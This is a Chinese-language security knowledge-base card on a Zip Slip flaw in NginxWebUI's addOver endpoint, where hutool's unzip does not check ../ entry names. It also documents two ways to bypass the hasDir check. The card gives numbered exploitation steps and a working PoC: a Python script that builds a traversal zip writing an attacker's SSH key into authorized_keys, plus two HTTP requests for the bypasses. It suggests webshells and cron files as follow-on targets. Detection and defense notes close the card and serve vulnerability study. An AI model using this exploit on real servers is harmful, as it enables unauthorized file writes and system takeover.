---
id: web-generic-file-upload-nginxwebui-addover-zipslip-hasdir-bypass
title: NginxWebUI addOver Zip Slip：hutool ZipUtil 不校验条目 ../ + hasDir 重名检查用 id/未用目录绕过
type: scenario
domain: web
path: web/generic/file-upload
technique: nginxwebui-addover-zipslip-hasdir-bypass
aliases:
- NginxWebUI Zip Slip
- addOver 目录穿越
- 路径重复绕过
- hutool ZipUtil unzip 穿越
tags:
- java
- nginxwebui
- zip-slip
- hutool
- path-traversal
- arbitrary-write
- hasdir
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-10'
updated: '2026-11-10'
affected_versions: 3.9.8（原文审计版本；原文称 3.9.9 未修复这些点）
verification:
  verified_by: verifier-V474
  verified_at: '2026-11-10T17:41:04+08:00'
  notes: 已对照原文图12-25核对；hutool ZipUtil/ZipReader 不校验 ZipEntry ../、hasDir 用 id<>?/未入库 dir 绕过均与原文一致；与 addover-arbitrary-unzip 卡为同接口不同原语（dir 直达 vs 条目穿越），非同链重复；affected_versions=3.9.8 原文明确
---

## 一句话结论

NginxWebUI 的静态网页上传接口 `adminPage/www/addOver` 把用户上传的 zip 交给 hutool `ZipUtil.unzip` 解压，而 hutool 的 `ZipReader.readTo` 不检查 `ZipEntry` 名称里的 `../`，条目名可穿越到解压目录之外任意写文件；接口前置的 `hasDir(dir, id)` 只查数据库中的同名目录用于提示“路径重复”，传一个已存在的 `id`（查询用 `id<>?` 排除自身）或选一个未入库的 `dir` 就能绕过，实现可重复的 Zip Slip。

## 原理

- **Zip Slip sink**：`WwwController#addOver` 调用 `ZipUtil.unzip(dirTemp, www.getDir())`；hutool 的实现中 `ZipReader` 遍历 `ZipEntry` 后 `readTo(outFile)`，落点由条目名直接拼出，没有 `../`、绝对路径或规范化后的前缀校验。攻击者构造条目名 `../../../../../../home/user/.ssh/authorized_keys`，解压时就会写到目标目录之外。
- **hasDir 只是重名提示**：`WwwService.hasDir(String dir, String id)` 构造 `ConditionAndWrapper().eq("dir", dir)`；若 `id` 非空再 `ne("id", id)`；最终 `findCountByQuery` 生成 `SELECT COUNT(*) FROM "www" WHERE dir=? [AND id<>?]`。返回 >0 时 `addOver` 直接返回“路径重复”，不执行解压。
- **绕过一（带 id）**：把要写入的目录已有的记录 `id` 一起提交，SQL 排除该 id 后计数为 0，检查通过，解压照常执行；`id` 可从列表页 F12/数据库获得。这样同一个真实目标目录可以反复覆盖。
- **绕过二（未用目录）**：`dir` 填任意一个数据库中没有的目录（例如 `/home/user/`），检查必然通过；zip 条目再用 `../` 穿越到真正想写的路径（如 `.ssh/authorized_keys`）。每次换不同的“占位 dir”即可重复利用。
- **后利用**：写 authorized_keys、Web 根脚本、cron/systemd 文件均可；由于写入发生在解压阶段，`hasDir` 的安全语义完全失效。

## 触发条件

- NginxWebUI 3.9.8 左右版本，攻击者已登录后台。
- 能上传 zip（`adminPage/main/upload`）并调用 `adminPage/www/addOver` 指定 `dir`/`dirTemp`。
- Web 进程对 zip 条目穿越后的目标路径有写权限。
- hutool 版本对应 `ZipUtil.unzip` 不做条目名校验的实现。

## 利用步骤

1. 制作 zip，条目名为 `../../../../../../home/user/.ssh/authorized_keys`，内容为攻击者公钥；上传得到临时路径。
2. 方案 A：查询目标目录在 `www` 表中的 `id`，提交 `addOver` 时带上 `id` 与真实 `dir`，绕过重名检查。
3. 方案 B：`dir` 填一个未入库的占位目录（如 `/home/user/`），`dirTemp` 指向 zip，利用条目 `../` 穿越写入真实目标。
4. 验证目标文件出现；后续重复时更换占位目录或更新 id。
5. 结合上传点写 WebShell 或 SSH 公钥完成 RCE/登录。

## PoC

```bash
# 生成 Zip Slip 包：条目名穿越到目标路径
python - <<'PY'
import zipfile
with zipfile.ZipFile('zip_slip.zip', 'w') as z:
    z.writestr('../../../../../../home/snake/.ssh/authorized_keys', 'ssh-rsa AAAA... attacker\n')
PY
```

```http
POST /adminPage/www/addOver HTTP/1.1
Content-Type: application/x-www-form-urlencoded

# 绕过方式一：带已存在记录的 id，dir 为真实目标
id=971035476620349440&dir=%2Fhome%2Fsnake%2F.ssh%2F&dirTemp=%2Ftmp%2Fzip_slip.zip
```

```http
POST /adminPage/www/addOver HTTP/1.1
Content-Type: application/x-www-form-urlencoded

# 绕过方式二：dir 用未入库的占位目录，靠 zip 条目穿越
id=&dir=%2Fhome%2Fsnake%2F&dirTemp=%2Ftmp%2Fzip_slip.zip
```

## 变体与关联

- 变体：条目名使用 `..\\`（Windows）、绝对路径、`....//` 等；hutool 不同版本对 `..` 的处理需实测。
- 关联：[[web-generic-file-upload-zip-slip-webshell-write]]（Zip Slip 通用原理与 Web 根写入）。
- 关联：[[web-generic-file-upload-nginxwebui-addover-arbitrary-unzip-ssh-key]]（同一接口的“目标目录可控”利用路径）。

## 检测与防御

- 检测：上传 zip 的条目名含 `..`、绝对路径或反斜杠；`addOver` 的 `dir`/`id` 组合异常（真实目录配旧 id、占位目录配穿越包）。
- 检测：解压后目标目录之外出现新文件；`.ssh`、Web 根、cron 目录被写入。
- 防御：升级/替换 hutool 为校验条目名的解压实现；解压前对每个 `ZipEntry` 做 `getName()` 规范化并校验前缀，拒绝 `..` 与绝对路径；解压目录固定且不可由用户指定；`hasDir` 不应作为安全控制；后台最小权限与访问控制。
